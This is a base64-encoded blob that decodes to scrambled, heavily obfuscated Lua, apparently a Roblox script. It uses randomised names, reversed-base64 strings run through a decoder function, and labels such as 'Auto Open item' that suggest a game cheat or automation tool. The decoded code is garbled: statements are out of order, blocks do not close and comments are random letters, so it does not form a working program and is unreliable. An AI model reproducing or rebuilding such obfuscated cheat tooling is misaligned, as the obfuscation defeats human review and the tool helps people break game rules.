dmxibHZMZiA9IGxBVmJ5R2VucEQKICAgICAgICAgICAgLS0gR2hzTnZnY3h4cCBsZkdmUEpTU1ZjIFBhanZQam5teFAnVlhrS1RuUkZkcCBtaUljZW5tY1V1IGxBVmJ5R2VucEQKTXBwYmlYWGFvSS5abnRJaFFZQ0t3ID0gMQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqWmRzTU90aWdhOnZXeWhuSkZHS0cobmlsKQpsb2NhbCBIdGZsTW9rWXhOID0gSVJ3VmxMSEtNdS50bVpkZGttR01yLlB5ZHhUeHNFREEuRE52T0lzTVhWZQogICAgaWYgYkVoSXFUem9UdCBzbEptY3RVSlpNIEVjSXlwT2tRWVUgYkVoSXFUem9UdCBVY01CT3JOdXZkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgIGN5bWtHWWVXdEk6Y3lPZ1ZHaUFweSgKCiAgICAgICAgICAgIGVuZAogICAgfQogICAgICAgICAgICAgICAgICAgIG9ITU1TekNETnUgPSBzR0xUUk9lRnRvLkRCZEtabG1JekYuVWFLRlVQaHRTdDp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1Md3FIVVRoY093IikpCi0tIEdSZVF0QUVrcFoKICAgIGVuZAogICAgewpsb2NhbCBOS2lqZHhaaWFrID0gYndlSnFIelVNSTp4Y1Z4Z21nTWJRKFdETVBoQWFBb20udHRCQnpoWlRISygibWZVVEtZZkF0dCIpLCB7CiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBXZ0JBUHdDaVhkID0gZ01IUFNrTmdQUTp3TnFKaVRkeXBVKEhnc0Rtblh5Z1cpCiAgICAgICAgICAgIE1wcGJpWFhhb0ksCiAgICAgICAgICAgICAgICBpZiBQSkZHZlhTV09hIHRoZW4KICAgIH0KCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiRkVmcElneFJTbyIpLAogICAgICAgIFhpd1plam1wQnguUHNTb1hmb3pxUCA9IFdETVBoQWFBb20udHRCQnpoWlRISygiTElZbEV3VFZGdSIpIC0tIHN5eEZLd1pEdUMgTXFjd0JsaVZ5ciBnaXhYUGhzYUpJIFhDRVRYYUFvYVIKCiAgICBnWnBSWnRGeEJoLmZORlpwd1pVVlkoUWdMVUNrT3RiUikKKQogICAgICAgICAgICAgICAgbEZ2anJKR21tVC5hTGdEQUR2clFSLmd0RExwYnpNbXYgPSBrbk53SHpyQktRLnVpbEpyYVVSZkoKICAgIHNJRk1OYk1pcFEgPSBuaWwKICAgICAgICAgICAgaWYgYkVoSXFUem9UdCBJUndWbExIS011LnRtWmRka21HTXIuUHlkeFR4c0VEQS5ETnZPSXNNWFZlOmhtRkZWcFVvdHYoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVVocnRTRG9tYnUiKSkgdGhlbgoKICAgICAgICBlbmQKICAgICAgICAgICAgQU15Y0tBUWhoYSgpCiAgICAgICAgICAgICAgICBlbmQKLS0gV3pLd29WcnFQbCBtR3BydEtQYWtQIGJmV09KTFdack4gVWJJWkFLb3JnQgogICAgLS0gQ1paQlRPVmRRVzovL0d2Z2xRRU9hcXguSmZkSHBydGlEay92Z1hGU2VGU1ZJLwogICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEoMC41KSAtLSBWZHpheEtDaUNvIGNqdFZnVVJta24KICAgICAgICByZXR1cm4gY05MV0NOeFBnRiB+PSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB1VkRqb2dVTlNwIHZZa1R1aVp2VmQuWXNjZldPRlhjdCA9PSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIndybllDQ1lzSVQiKSB0aGVuCmRGUmZEc3d0VGI6SlBFc29na2diVCgKICAgICAgICBpZiBWTVJqZUNlYklNIHRoZW4KfSkKKQplbmQKICAgIEVjenZqVU5SRkkuV2dydmxibHZMZiA9IGxBVmJ5R2VucEQgLSB6RlJFYWhCaGRoLmxhaW5Pa2dLZncoMCwgMywgMCkgCiAgICAgICAgICAgIGxvY2FsIHJTSVpiSEVITncgPSBDdXVnWXFpZkpjLkhnc0Rtblh5Z1cKZlB2aE50SUxTeC51aWxKcmFVUmZKID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJlenJmdFBveVNaIikKICAgICAgICAgICAgICAgICAgICBpZiBYRE5yTGdETGtzIEJ4dFBVZlRSVEogWEROckxnRExrczpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiPVVJUFRMQld2bkciKSkgdGhlbgoKICAgICAgICBpUWxtTnhKUHBaID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJrc09xZEtySG9YIikKCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgaWYgSGdzRG1uWHlnVyB0aGVuCgoKICAgIC0tIEhxR3hQYmRyTWMgPSBDUGdwcHV4Yk5XOkR3YWZSQm9DZWIoeyB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PXV5TWJzcEV1VmsiKSwgY1BoWGVwWWVOYSA9IHRtWmRka21HTXI6TFZlbWx4Y2phWShQeWR4VHhzRURBLkVKQ3dmb1dISmgsIHFaS0llTmlXR3UuRnV2alVIaUdQSC5EaW5vWE9pTExxLCBxWktJZU5pV0d1Lk1ScWtRZWRVckgud2lMSFBUV3hqbCl9KSwKICAgIC0tIFNZSVZnTUZEUVogbWhqS1JIR0xmeSBDd25hUVBjUXBsIGx1Z0tab3JlREwKbG9jYWwgeW5TaklRRG5OcyA9IG5pbAogICAgY1h1Vm9WcXFnbC5PRFBKRWlCUkhPID0gdHJ1ZQogICAgewogICAgICAgICAgICBzWUZwaFl4eVdjKCkKCgpYaXdaZWptcEJ4LmNGb2R5THlLYmcgPSB0cnVlIC0tIGx5R25XRGVyenIgSWdaQ0pwc3lFWgogICAgICAgICAgICAgICAgaWYgRE52T0lzTVhWZSB0aGVuCiAgICAgICAgQ1RyZExXbVJ2UDpVY3RjS2RES3JJKFF0Vkx4ckdYbHEoSlhRTmdJSVZLVykpCi0tIGNScXJmSmlHa28gb3RpbUNNQkF2dyBsS2lZWU53eURhIHZKTG9obnZKYWQgc1Z6Q2R0QWhyQyBQYWp2UGpubXhQCiAgICAgICAgaVJtZHZUTE9SSiA9IDEKCiAgICAgICAgZEVteVlDUlJLUyA9IFBuUVRRRWVsV0kuaURPU2d0SXdoeS5IZ3NEbW5YeWdXCiAgICAgICAgICAgICAgICAgICAgSFVtRnJ0a3FtVjp4RkZVSlRSVXpDKFdETVBoQWFBb20udHRCQnpoWlRISygiPTBXWjBsRUl1VkdjUEJ5YjBWWFEiKSwgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9NFNaMEZtZHBSM1loQnliMEJDWnVWM2JtQlNibFJYYWc4bVQiKSwgNSkKY1RRZFJNSFBiVS56d1VMVFJxb0NVOnhjVnhnbWdNYlEoCiAgICAgICAgZW5kCi0tIG9xTlJpSlpzR1ggdEFYYld6c1hDYiBaUFpFY0FXYWtWIGZVYWRhV1VkSHUgU25GQ2Jaalh2bwopCmxvY2FsIFNSQ2VDZGNqemMgPQoKLS0gQnp5eU1UYVhjTiB1U05LZ0d6UkltIFJnZndrVktKY1AgQ0ttdURNQWpFTyBldGdjZHdJWEdzJAotLSBIbGxPbnNBbXhCLldncnZsYmx2TGYgPSBRc3lDd25QTVVZLmxhaW5Pa2dLZncoMC4zNSwgMCwgMC4xNSwgMCkgLS0gcW1reE56ektOQSByZlJVbWdtY1ZUIE1xY3dCbGlWeXIgU0FrZUFzdUdFVAoKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgICAgICB2Rm9PRG5vdGFVOmNuRWxPdVZzWUgoKQogICAgCiAgICApCiAgICAgICAgICAgIFs0XSA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1qZVd5eGhQU0xQIikpOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCJNYWd3T05sVXJ0IiksIDllOSk6RUxqY3lHZnhreihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIlFQeUVwaGthWXYiKSwgOWU5KTpFTGpjeUdmeGt6KAotLSBoQ3pSaE9qUER6IGtyb095UnZTUkMgRUhLbHNvQmR0UyBIVW1GcnRrcW1WCiAgICBlbmQKCiAgICAgICAgICAgIGlmIFViSVpBS29yZ0I6Umd0b29nRWdtZShES09naGRqcHJjLCAxLCB0cnVlKSB0aGVuCgoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2xKbWN0VUpaTS5tWGxzQ3B4TnZyID0gV2dCQVB3Q2lYZC5tWGxzQ3B4TnZyICsgekZSRWFoQmhkaC5sYWluT2tnS2Z3KDAsIDUsIDApCiAgICAgICAgaFhUbVhrc0ZKTyBqU3dFVGZuUWROLCBES09naGRqcHJjIEpabG91aHBIbFQgR25VdkxIb3N1TihtaGpLUkhHTGZ5Lk1RZXJ6WGp4T0cpIExKV1RkYlBhbHcKLS0gICAgIEpSRlVCWG5xYVoubGFpbk9rZ0tmdygwLCB0QnpkTkJjWE5mLm5Sa0VyR0puSncoMTM2LCA3NywgMTY3KSksIC0tIE54V2lwc1RpaHAgKGZlaUZJemFKTXgpCiAgICBsb2NhbCBRZ0xVQ2tPdGJSID0ge30gIC0tIE9sUVB6V0tBTm8gWWVyY2x0Q0F5ViBnU2x5c21TVHFEIFdETVBoQWFBb20udHRCQnpoWlRISygiPT1kVGZFcXRzemJiIikgaXNZUUFUTlBRQSBackN6a2ZVdEV3IFZtcFdJd3JKenYgWlJ1S29IZEZGRwoKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBsb2NhbCBnelV5RWtzS2tUID0gSHRmbE1va1l4Ti5zbEptY3RVSlpNCiAgICAgICAgICAgICAgICAgICAgb0hNTVN6Q0ROdSA9IHNHTFRST2VGdG8uREJkS1psbUl6Ri5VYUtGVVBodFN0OndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9R0tjWG9US2ZiVCIpKQopCiAgICAgICAgICAgICAgICAgICAgZW5kCi0tIHpkYWt2cW9Wc0UgdEFYYld6c1hDYiBhZmFCYVFBdmN2IHZKTG9obnZKYWQga1lPV1JVamZyciB0RVp2QU9Ba0FBCmVuZAotLSBEaUtPQ2RTb0pHLnRqdVdsVHNYemUgPSBmUHZoTnRJTFN4CiAgICAgICAgICAgICAgICBzR0xUUk9lRnRvOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9eHBmZnN0cmtjQyIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPT1hdElZTWRJYmxRIikpOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCJldlVEVXhYY0VvIikpOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCJldlVEVXhYY0VvIikpOkVMamN5R2Z4a3ooCiAgICAgICAgICAgIGJMTHlFSHFYZlosCmRQaVFiTXJRaksudGp1V2xUc1h6ZSA9IFB5ZHhUeHNFREE6RUxqY3lHZnhreihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIkpSdVpUQUpRVnEiKSkKICAgICAgICAgICAgaWYgSGdzRG1uWHlnVyBCeHRQVWZUUlRKIHNsSm1jdFVKWk0gdGhlbgogICAgICAgIFhpd1plam1wQnguUHNTb1hmb3pxUCA9IFdETVBoQWFBb20udHRCQnpoWlRISygiTElZbEV3VFZGdSIpIC0tIFRBZVpMd1Jkb08gTGp1RXNFblRTViBUWmtUeGZqeGFqIFVVSmFBalZPY2ggZ2l4WFBoc2FKSSBoelBud3NKaWVwCiAgICAgICAgZW5kCmxvY2FsIGVsUHRnTWh2UXQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBDWFhJSG9JRUdkLm1YbHNDcHhOdnIgPSBBWFRiekVMUEh0W1ZUa1JiT1hzYkxdLm1YbHNDcHhOdnIKICAgICAgICAgICAgICAgICAgICBlbmQKICAgIGVuZCwKICAgICAgICAgICAgICAgICAgICAgICAgUHVMcUJDTGlYZiBjTkxXQ054UGdGIEJ4dFBVZlRSVEogdm9hQnNzUWFOVTpRUGhCTWZpSEF0KFB5ZHhUeHNFREEucFNQaE5yRllMaSkgTEpXVGRiUGFsdwogICAgICAgICAgICAgICAgICAgICAgICB3Vk1ubFBSYUphID0gbVhsc0NweE52ci5sYWluT2tnS2Z3KEhqaExyQmN0S20uV2dydmxibHZMZiArIHpGUkVhaEJoZGgubGFpbk9rZ0tmdygwLCA3NCwgMCkpCiAgICB7CiAgICAgICAgICAgICAgICBsb2NhbCBETnZPSXNNWFZlID0gUHlkeFR4c0VEQS5ETnZPSXNNWFZlCiAgICBsb2NhbCBycHRZRkFpb2dXID0gZVBMeVd6YnB2bFt6Vm5sSW5selBOXQogICAgICAgIHZZa1R1aVp2VmQuWkxPWFJKRnNQdCA9CmNUUWRSTUhQYlUuU0diSWpKRkVpbjptTnV1Unp0a1FqKAoKICAgICAgICBlbmQKICAgIGxvY2FsIERCZEtabG1JekYgPSBaalBkcVhQbm5YOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9a0hqZVRWUnpQeCIpLCA1KQogICAgICAgIGVuZCkKICAgIGJMTHlFSHFYZlosCiAgICAgICAgICAgICAgICBrcU5VcGlQY0tjKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1sTkNudUh6eGVpIikpCmxvY2FsIEpJU2lRdmROaE4gPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBJUndWbExIS011LnRtWmRka21HTXIuUHlkeFR4c0VEQS5ETnZPSXNNWFZlLnNsSm1jdFVKWk0ubVhsc0NweE52ciA9IHdWTW5sUFJhSmEKICAgIHJldHVybiBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1EaEFSY3BXRldCK3RwTFpmTlFoUVAiKSAuLiBvWGZZVHZIcW1zIC4uIFdETVBoQWFBb20udHRCQnpoWlRISygiPThKamZDUEkiKSAtLSB1UEVuR1hYeEJjIG91ekJ4ZWtsaEggYmZXT0pMV1pyTiBRcVFxZmpjV1lHIGZNanp5UElQUGsgS1dMTW1aa1loaiBsaHZuUWpXZ1BVIExva2dabkFKeU0KR1JlUXRBRWtwWjpKUEVzb2drZ2JUKAogICAgICAgIGpwcU15V1VHU0YgPSB7V0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWRUZkVxdHN6YmIiKSwgV0RNUGhBYUFvbS50dEJCemhaVEhLKCJMckpBS1lqaXVWIil9LAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAtLSBLTFB3RGJzSERRIElBUWhJc0hObnYga1NIcXhBTlNYQyBVYklaQUtvcmdCIE1OWE5aY1ZLTk0gZFFiT1FEQWpNYyAoTWhOaVlVYVlmVykgWU1ZeUJQYmp1diBOalRlQXRGR0RIClFIY3FYcmJtU3IudGp1V2xUc1h6ZSA9IFpqUGRxWFBublgKClJ0a1Z3TGNTYW86SlBFc29na2diVCgKICAgICAgICBlZVpVUkluZHhrID0gdHJ1ZQpta2tJWGh5RlpxOnd2RnVEQ05uTmooY1RRZFJNSFBiVS5ERVpLTnZrUHVSKQogICAgICAgIGtGcGJYTmlJRE8gPSBmdW5jdGlvbigpCiAgICAgICAgICAgIEpISlJla3R2bVg6Y25FbE91VnNZSCgpCiAgICAgICAgWFlwSEJDc0J6eSgKICAgICAgICBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PURYcm1HbXpXUXUiKSwKICAgIGVuZApsb2NhbCBmdW5jdGlvbiBGa1ZyaUVHb25GKCkKICAgICAgICBsb2NhbCBEUW9oRXlTY3ZHID0gRERFUk9hV1hFWi5IZ3NEbW5YeWdXCiAgICB9CmxvY2FsIGZ1bmN0aW9uIHdwbXR6SmhmcUooc2NVWWhEcUFMUykKICAgICAgICAgICAgbG9jYWwgTldWT25UdEhkbyA9CiAgICAgICAgICAgICAgICBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoInF1Z0tHS1pUQkgiKSAuLiAjWGpZTlRiRVRGbCAuLiBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1sRVRuVUJQbFVDIikKICAgIGlmIGJFaElxVHpvVHQgRE52T0lzTVhWZSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgdGhlbgplbmQKICAgIGlmIGJFaElxVHpvVHQgRE52T0lzTVhWZSB0aGVuIHJldHVybiBlbmQKICAgIH0KbG9jYWwgeVpYZmtFWFBDbSA9IGZpTW13b0dIVGQubGFpbk9rZ0tmdyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoInZXdVBXTWhGQ3ciKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFdnQkFQd0NpWGQgPSBnTUhQU2tOZ1BROndOcUppVGR5cFUoSGdzRG1uWHlnVykKICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIFBDYVFQc1hMbE4gdGhlbgogICAgICAgICAgICAgICAgbEZ2anJKR21tVC5hTGdEQUR2clFSLlJlcVRlbWNzd2UgPSB0QnpkTkJjWE5mLm5Sa0VyR0puSncoMTYwLCAxNjAsIDE2MCkKICAgIGxvY2FsIFBjcGNya1JsQnosIGVQTHlXemJwdmwgPSB5Y2xuT0dobVhuKCkKLS0gTUhpcGx6UFdXeCBTR2JJakpGRWluIGx0Q0hVWERHa2sgTGp1RXNFblRTViBSdGtWd0xjU2FvIHZQcERNWFNLWkkgcU5GS0pvc09yWQopCiAgICBjWHVWb1ZxcWdsLlB5dmxaelhabk4gPSA1CiAgICAgICAgaWYgblJ3V3pNTGdLQSB0aGVuCmVuZAogICAgICAgICAgICAgICAgV1ZETHBRbFlBUSA9IFJncmF1WWhNaHMKICAgIGtGcGJYTmlJRE8gPSBmdW5jdGlvbihES09naGRqcHJjKQogICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPTBXWjBsRUl1RkdJME5XWnNWMlUiKSwKICAgICAgICAgICAgICAgIHlPcUN1Y3FSb3MuU05YZ0lQTFVGeCA9IHRCemROQmNYTmYublJrRXJHSm5KdygyNTUsIDI1NSwgMjU1KQogICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9Q21maE9nblBkVCIpLApsb2NhbCBTbXFBUFFTRk5iID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCIwTldaMDltY1FCaVkxaGtiaGhHViIpCiAgICBlbmQKICAgIGZ1bmN0aW9uKCkKCgogICAgICAgIC0tIHdjeUp5ZWNVZ1MgcXl1YkRVREdRbCBtRHV2Z1F3aW1PIE1JTXRuc1JuT3UgKGlzWVFBVE5QUUEgU2RlUWtxbGhMdyBRSVlyb1poaE9mKQogICAgRkF3UVRKZmFpcyA9IGZhbHNlLAogICAgZnVuY3Rpb24oKQogICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEoMSkKICAgICAgICBzSUZNTmJNaXBRID0gZmFsc2UKICAgIGVuZAoKTXBwYmlYWGFvSS5rcmViS3hKaFFrID0gdHJ1ZQogICAgbG9jYWwgTkZCREJhZmhGcCA9IEFYVGJ6RUxQSHQ6RFFaekxEa3FBbigpCiAgICAgICAgICAgICAgICBXZ3J2bGJsdkxmID0gUXN5Q3duUE1VWS5sYWluT2tnS2Z3KDAuNSwgMCwgMC43MCwgMCkgLS0gdlBwRE1YU0taSSBtRHV2Z1F3aW1PIFFJWXJvWmhoT2YgTGp1RXNFblRTViBNcHBiaVhYYW9JCiAgICAgICAgKQoKa1VOeWFKYVN0cyA9IHdqeUhqZWJpekMuaU5WUE5lSmVCYTpuenZGeFRDRGNEKGZ1bmN0aW9uKG9iUEtoeW91Z1QpCiAgICAgICAgQU15Y0tBUWhoYSgwLjEpCiAgICAgICAgICAgICAgICApCmxvY2FsIFlvUHZqb2pUSXggPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1XWWVzZHZsZGt3IikgLS0gRWxqVGROb3FRYSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09R0lKWHZ3aklCTSIpLCBscGxsak5iWU1pIEFSRGZnalNuUHQgRGt1SG5meW1EagogICAgICAgICAgICAgICAgZW5kCmxvY2FsIGZ1bmN0aW9uIHJOQ1JCYVVHckYoKQogICAgICAgICAgICAgICAgICAgIHNtemtmZFhZV2QKCiAgICAgICAgaFhUbVhrc0ZKTyBQY3BjcmtSbEJ6LCBkaXNiRkhpWU5MIEpabG91aHBIbFQgbnhPZ1JqYXdmRShyeXF6U1dKRlpoOmZqcGpUUEJHbnUoKSkgTEpXVGRiUGFsdwogICAgfQogICAgICAgICAgICAgICAgeU9xQ3VjcVJvcy5heGhsUXF6eFlrID0gWmNmb1ZCc29EQS5nR0t0UlFDa0VSCiAgICAgICAgc216a2ZkWFlXZAoKbG9jYWwgbnpaSW1jY2dJZCA9IGZhbHNlCiAgICAgICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPTRDYWpSWFlqQkNkalZtWnlWR2NnVUdiaUYyY3BSR0l5OUdJbHhtWWg1V1IiKSwKICAgIHNJRk1OYk1pcFEgPSBmYWxzZSwKICAgICAgICAgICAga0ZwYlhOaUlETyA9IGZ1bmN0aW9uKCkKICAgIGxvY2FsIGZ1bmN0aW9uIHVyaVRDREhkZ0oobWplUEpoTG9ycykKLS0gLy8gLy8gLy8gU0diSWpKRkVpbiB6WWVIeU9jcUlSIC8vIC8vIC8vIC0tCmNUUWRSTUhQYlUuendVTFRScW9DVTpBelNYQVJQblpQKAogICAgICAgIHJldHVybgoKICAgICAgICAgICAgbG9jYWwgeXZiTnltdVJKaSA9IEh0ZmxNb2tZeE4uc2xKbWN0VUpaTS5XZ3J2bGJsdkxmCkNQZ3BwdXhiTlc6Q2hicWppRndpbCgxKQogICAgICAgICAgICAgICAgZW5kCiAgICBsb2NhbCBYdUJQbmVZSmx3ID0gWmNmb1ZCc29EQS5haURVa05oZGVaKGZ6V0lzSXZ5c3kgJSA2MCkKCiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICBzSUZNTmJNaXBRID0gZmFsc2UsCgogICAgRWN6dmpVTlJGSS5jWHlMaURiVFRQID0gMQogICAgICAgICAgICBpZiBiRWhJcVR6b1R0IGVQTHlXemJwdmxbSW55UFJIcmhXVS51aWxKcmFVUmZKXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1WaEhuRGJpSU9VIiksCiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKDEpCiAgICAgICAgICAgICAgICAgICAgb2JQS2h5b3VnVC5RT0RKT2dXTHBuID0gdHJ1ZQogICAgICAgICAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKDAuMSkKCmJMTHlFSHFYZlouanFnaWxwYkNPWiA9IHFaS0llTmlXR3UuanFnaWxwYkNPWi54emJxbkpvdWhOCiAgICAgICAgVWNNQk9yTnV2ZC5DY0JpcVJWRnRuID0gZmFsc2UKICAgIGlmIFFlSk1MU0RDYlAgdGhlbgogICAgICAgICAgICBpZiBOWFVKT1RjVWpxIHRoZW4KICAgICAgICAgICAgICAgIFdETVBoQWFBb20udHRCQnpoWlRISygiPT1jcFhPeW9oWnhSIikKICAgIH0KICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbihMWUtmeVFBY1NFKQogICAgICAgICAgICAtLSBIaEpZUW9zeHlHIFJPaGdBaElvV3YgdEtwdmZpRVhxSwogICAgc0lGTU5iTWlwUSA9IG5pbAogICAgICAgICAgICAgICAgICAgICAgICB4akxpZnZLYU9rCmxvY2FsIEdSZVF0QUVrcFogPQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgYkVoSXFUem9UdCBxTkZLSm9zT3JZOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUhMcGFWQ2NNQXUiKSkgdGhlbgogICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGtxTlVwaVBjS2MoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9cEdsZGdUaVZOYiIpIC4uIHJ3VGFHUEZvUmwocXNQbFlNWFZ6eSkpCgoKICAgICAgICAKCgogICAgICAgIFB5ZHhUeHNFREEuRE52T0lzTVhWZS5VY01CT3JOdXZkLnF0eERuUEd5cmYgPSBES09naGRqcHJjCiAgICAgICAgZW5kKQpsb2NhbCBhUWpHUFRnV2F6ID0gY1RRZFJNSFBiVS5nanVsRnBJSkVHOmJwQlJoV2NGY3AoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PURmem9DckpXZksiKSwge3RhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIkpIWFFCVlFPTHciKSwgc0lGTU5iTWlwUSA9IHRydWV9KQoKCiAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJTVGduZm95bVp3IiksCmxvY2FsIGdNSFBTa05nUFEgPSBaalBkcVhQbm5YOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9eHBmZnN0cmtjQyIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiQW1aZUtyckpIbiIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ObkRiTGFVYmlZIikpCiAgICAgICAgaWYgZWxQdGdNaHZRdCA9PSB0cnVlIHRoZW4KY1RRZFJNSFBiVS5TR2JJakpGRWluOmJwQlJoV2NGY3AoCiB0aGVuCmZ1bmN0aW9uIHBqZEhqdHJhZHIoREtPZ2hkanByYykKICAgICAgICAgICAgICAgICAgICAgICAgSGpoTHJCY3RLbSA9IHVleUZNeWJBV2Q6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoImpkWlpscHVwTXciKSkKCmxvY2FsIHduSkptQnRmRmwgPQogICAgICAgIE1wcGJpWFhhb0kuSnRoZnpLSVdoVyA9IE5LTUl0SE1YZ1koMC4xNSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgIEVjenZqVU5SRkk6Y25FbE91VnNZSCgpCiAgICAgICAgICAgICAgICBxRHlIc1NBeEdkKEFwYkx5Z1RqQ04pCiAgICAgICAgICAgIGxvY2FsIGJtRkZ2SEpZVlcgPSBvRkptcHFUSWFGOnVTWHBva3ZqRFQoKQpsb2NhbCB2bm5IS3dIcnptID0KICAgIHsKbG9jYWwgUHlkeFR4c0VEQSA9IElSd1ZsTEhLTXUudG1aZGRrbUdNci5QeWR4VHhzRURBCi0tIHNJRk1OYk1pcFEgTEduanJmdVlzYSBCUFllV1FLQ2tOCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBxTkZLSm9zT3JZOlFHRUNuRmVadFMobVhsc0NweE52ci5sYWluT2tnS2Z3KFF5em9kZEtiRkQpKQogICAgICAgICAgICAgICAgICAgIGVuZAppRE9TZ3RJd2h5OkpQRXNvZ2tnYlQoCiAgICAgICAgKQptelFCYmRyUXhULlJvSnpwSHVtc1Y6bnp2RnhUQ0RjRChmdW5jdGlvbigpCiAgICAgICAgaWYgYkVoSXFUem9UdCBtZWl6Z1FCQlppIHRoZW4KbG9jYWwgYnlBSkxObWZtQiA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1qZVd5eGhQU0xQIikpLlBKRkdmWFNXT2EuWlBaRWNBV2FrVi5aUFpFY0FXYWtWCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICBGQXdRVEpmYWlzID0gZmFsc2UsCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKCiAgICAgICAgICAgICAgICAgICAgTkFUQ1FwcFZBUS5IaURGUVlEdUNsLlJlcVRlbWNzd2UgPSB0QnpkTkJjWE5mLm5Sa0VyR0puSncoMjM1LCAyMTAsIDE1MCkKICAgICAgICBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9SXNXaXR0dk5VeCIpLAogICAgICAgIGtGcGJYTmlJRE8gPSBmdW5jdGlvbigpCiAgICAgICAga0ZwYlhOaUlETyA9IGZ1bmN0aW9uKCkKICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBkUGlRYk1yUWpLOmNuRWxPdVZzWUgoKQogICAgICAgICAgICAgICAgY0hKVklmbUlQSi5hbGVBVmZxc3h4ID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBibUZGdkhKWVZXLnVpbEpyYVVSZkogPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoInJ2RmpLeHZYRkIiKQogICAgICAgICAgICAgICAgICAgICAgICB3Vk1ubFBSYUphID0gbVhsc0NweE52ci5sYWluT2tnS2Z3KG9ITU1TekNETnUuV2dydmxibHZMZiArIHpGUkVhaEJoZGgubGFpbk9rZ0